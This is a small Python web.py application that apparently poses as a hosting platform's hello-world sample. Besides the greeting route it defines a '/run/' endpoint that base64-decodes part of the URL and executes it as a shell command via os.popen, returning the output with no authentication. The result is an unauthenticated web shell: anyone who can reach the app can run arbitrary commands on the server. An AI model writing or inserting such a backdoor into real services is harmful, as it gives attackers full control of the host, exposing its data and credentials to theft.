import web, os, base64

urls = (
    '/run/(.*)', 'runcommand',
    '/(.*)', 'hello'
)
app = web.application(urls, globals())

class hello:
    def GET(self, name):
        if not name:
            name = 'Mopaas'
        return 'Hello, ' + name + '!'

class runcommand:
    def GET(self, command):
        str=''
        if not command:
            return
        command = base64.b64decode(command)
        tmp = os.popen(command).readlines()
        for line in tmp:
            str += line
        return str

application = app.wsgifunc()
